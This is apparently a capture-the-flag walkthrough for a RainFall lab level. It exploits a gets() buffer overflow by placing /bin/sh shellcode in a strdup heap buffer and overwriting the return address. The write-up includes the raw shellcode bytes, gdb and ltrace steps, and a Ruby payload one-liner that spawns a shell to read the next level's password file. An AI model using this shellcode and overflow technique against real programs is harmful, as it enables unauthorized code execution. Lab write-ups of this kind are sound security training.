In this binary we can see that the 'gets' function is used again.
We will use buffer overflow to create asm binary code that will execute a shell and overwrite the EIP (return address) to call this code.
The binary code found to launch a shell is "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
We will add some NOP ('\x90') operators to fill the buffer.

To find it we will use gdb :
    $ gdb -q ./level2
    (gdb) run
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    info registers

There is a verification that our return address isn't overwritten.
    (gdb) disas p
    ...
    0x080484fb <+39>:    and    $0xb0000000,%eax
    0x08048500 <+44>:    cmp    $0xb0000000,%eax
    ...

The function 'p' will use strdup at the very end
    (gdb) disas p
    ...
    0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
    ...

strdup use malloc and we can see with ltrace that it return the address 0x0804a008.
level2@RainFall:~$ ltrace ./level2
    ...
    strdup("")                                    = 0x0804a008
    ...

By setting a breakpoint before and after the strdup call we can use info registers to see eax changing to this address.

Then we create a file using the previous informations :
    $ ruby -e 'print "\x90" * 35 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x08\xa0\x04\x08"' > /tmp/buffer_overload
    $ cat /tmp/buffer_overload - | ./level2
    cat /home/user/level3/.pass